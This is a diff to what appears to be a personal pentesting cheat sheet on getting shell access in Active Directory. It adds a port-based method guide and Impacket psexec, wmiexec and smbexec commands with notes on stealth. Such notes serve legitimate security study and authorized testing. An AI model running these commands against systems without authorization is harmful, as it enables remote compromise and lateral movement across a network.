@@ -1,5 +1,38 @@
 # Gaining Shell Access in AD
 
+## Prerequisites — Which Method to Use
+
+Check which port is open (`nmap`/`nxc`) and pick the method that fits:
+
+| Method | Needs | Notes |
+|---|---|---|
+| psexec / wmiexec / smbexec | SMB **445** + user is **local admin** on target | psexec = SYSTEM; wmiexec/smbexec stealthier |
+| evil-winrm | WinRM **5985** (or **5986** TLS) + user in **Remote Management Users** | clean shell, no SYSTEM |
+| RDP (xfreerdp) | RDP **3389** + **Remote Desktop Users** | GUI session |
+
+**Rule of thumb:** no WinRM (5985)? → fall back to **psexec** over SMB (445). No admin rights? → neither works, look for privesc first.
+
+---
+
+## Password Auth -> Shell
+
+With valid plaintext creds, use them directly:
+
+```sh
+# psexec - drops a service binary (noisy but reliable), gives SYSTEM
+psexec.py <domain>/<user>:'<password>'@<ip>
+
+# wmiexec - stealthier, runs in process space
+wmiexec.py <domain>/<user>:'<password>'@<ip>
+
+# smbexec - very stealthy, uses SMB shares
+smbexec.py <domain>/<user>:'<password>'@<ip>
+```
+
+> On Kali these are also installed as `impacket-psexec`, `impacket-wmiexec`, etc. (same tool).
+
+---
+
 ## Pass the Hash -> Shell
 
 Once you have NTLM hashes from SAM or secretsdump, use them for shell access:
